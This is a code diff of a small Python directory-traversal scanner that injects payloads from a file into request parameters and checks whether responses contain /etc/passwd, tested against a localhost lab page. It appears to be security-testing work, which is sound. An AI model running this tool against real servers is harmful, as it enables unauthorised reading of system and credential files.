@@ -1,61 +1,38 @@
 import sys
 import requests
+import library
 from bs4 import BeautifulSoup
 
-def run(link, soup):
-  print("Running {}\n".format(link))
+def run(injection_obj):
+  print("Running {}\n".format(injection_obj[1]))
 
   payloads = get_payload_list()
+  inject_payloads(injection_obj, payloads)
 
-  # TODO add checks
-  # if link is a get request
-  send_get_request(link, None, payloads)
+def inject_payloads(injection_obj, payloads):
+  method, link, params, cookie = injection_obj
+  is_exploitable = False
 
-  # else if link is post request
-  # send_post_request(link, None, payloads)
+  # try injection each payload into each param
+  for param_idx in range(len(params)):
+    for payload in payloads:
+      print("Trying {} request {} with {} as param {}".format(method, link, payload, params[param_idx]))
+      response = library.make_request(injection_obj, payload, param_idx)
+      is_exploitable = contains_passwd(response)
+      print("Exploitable with payload {}: {}\n".format(payload, is_exploitable))
+      # TODO : write results into json 
+
+      # TODO refactor this - break after finding the first successful payload
+      if is_exploitable:
+          break
+    if is_exploitable:
+        break
 
 def get_payload_list(filename='payloads/directory_traversal_payloads.txt'):
   """Returns payloads in payload file as a list"""
   with open(filename) as f:
     payloads = f.read().splitlines()
     return payloads
-
-def send_get_request(link, soup, payloads):
-  """Try payloads in a get request"""
-  for payload in payloads:
-    # TODO for the time being, assumes that:
-    # 1. there is only one param
-    # 2. link given to it includes the param name
-    # e.g. http://target.com/directorytraversal/directorytraversal.php?ascii=
-
-    full_link = link + payload
-    print("Trying get request {}".format(full_link))
-    response = requests.get(full_link)
-    is_exploitable = contains_passwd(response)
-    print("Exploitable with payload {}: {}\n".format(payload, is_exploitable))
-
-    # stop after finding the first payload that can be used to exploit the endpt
-    # because if can be exploited with ../../ then for sure can be exploited with ../../../
-    if is_exploitable:
-        break
-
-def send_post_request(link, soup, payloads):
-  """Try payloads in a post request"""
-  for payload in payloads:
-    # TODO change post request
-    # 1. params and link?
-    # 2. headers?
-    # 3. need to send data as JSON?
-
-    print("Trying post request {}".format(link))
-    response = requests.post(link, data = {'key':payload})
-    is_exploitable = contains_passwd(response)
-    print("Exploitable with payload {}: {}\n".format(payload, is_exploitable))
-
-    # stop after finding the first payload that can be used to exploit the endpt
-    # because if can be exploited with ../../ then for sure can be exploited with ../../../
-    if is_exploitable:
-        break
 
 def contains_passwd(response):
   """Checks if reponse constains /etc/passwd contents
@@ -87,8 +64,5 @@ def contains_passwd(response):
 
 # TODO for testing, remove when done
 if __name__ == '__main__':
-
-  if len(sys.argv) != 2:
-    print("input link pls")
-  else:
-    run(sys.argv[1], None)
+  injection_obj = ['GET','http://127.0.0.1:8888/directorytraversal/directorytraversal.php', ['ascii'], '']
+  run(injection_obj)
